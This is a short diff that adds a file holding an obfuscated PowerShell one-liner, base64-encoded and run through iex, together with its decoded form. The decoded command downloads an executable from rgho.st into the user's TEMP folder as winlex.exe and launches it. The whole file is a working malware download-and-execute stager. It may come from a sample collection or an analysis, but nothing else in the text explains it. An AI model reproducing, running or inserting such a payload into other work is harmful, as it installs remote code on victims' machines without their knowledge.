@@ -1,0 +1,7 @@
+iex([systeM.tEXt.eNcODInG]::uTf8.GetsTRING([sYStem.CONvERT]::fROMBaSe64STriNG('CihOZXctT2JqZWN0IFNZc3RFTS5OZVQud0ViQ0xpZU5UKS5ET3duTE9hREZpTEUoJ2h0dHA6Ly9yZ2hvLnN0LzY4bEpjR0ZMVycsIiRFblY6VEVNUFx3aW5sZXguZXhlIik7U3RhcnQtUHJvY2VzcyAoIiRFblY6VEVNUFx3aW5sZXguZXhlIikKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYstEM.NeT.wEbCLieNT).DOwnLOaDFiLE('http://rgho.st/68lJcGFLW',"$EnV:TEMP\winlex.exe");Start-Process ("$EnV:TEMP\winlex.exe")
+
